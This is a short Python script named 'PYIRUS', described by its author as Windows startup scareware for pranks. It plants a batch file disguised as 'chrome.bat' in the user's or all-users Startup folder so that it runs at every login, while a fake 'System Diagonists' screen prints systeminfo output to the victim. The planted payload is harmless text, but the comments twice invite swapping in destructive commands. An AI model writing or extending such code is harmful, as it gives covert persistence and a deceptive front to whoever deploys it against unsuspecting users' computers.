
'''PYIRUS A Simple Python Startup Scareware for windows developed by M.Anish '''

# This is python3 version of Cstorm.
# This Python Script is for Simple Pranks only. Use it at your own risk.
# The developer should not be held responsible under any case.

import os
def tunnel():
        os.system('echo %USERPROFILE%>user')
def tscan():
       if os.path.exists('user'):
        with open('user','r') as f:
                s=f.read().strip()
                s=s+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
                if os.path.exists(s):
                 with open(s+'\chrome.bat','w') as i:
                         i.write('\necho Hello World\npause')    #Here you can even write destructive commands to be executed by cmd.exe
                else:
                    try:
                       s='C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
                       if os.path.exists(s):
                          with open(s+'\chrome.bat','w') as i:
                              i.write('\necho Hello World\npause')    #Here you can even write destructive commands to be executed by cmd.exe
                    except PermissionError:
                               print('\n Incorrect File Permissions!. Please run Python as Administrator!')
                               x=input()
                               exit()
       else:
            exit(0)
def ok():
       if os.path.exists('user'):
           os.remove('user')
def run():
        tunnel()
        tscan()
        
def display(file):
        with open(file,'r') as f:
            s=f.read(1024)
            print(s)
            while len(s)>0:
                s=f.read(1024)
                print(s)
def pause():
        q=input('\nPress any key to continue...\n')
        
def main():
  run()
  ok()
  print(' \n |----- System Diagonists -----| ')
  print('\n Checking PC for problems...')
  os.system('systeminfo>getlog')
  display('getlog')
  os.remove('getlog')
  pause()
  
main()
 
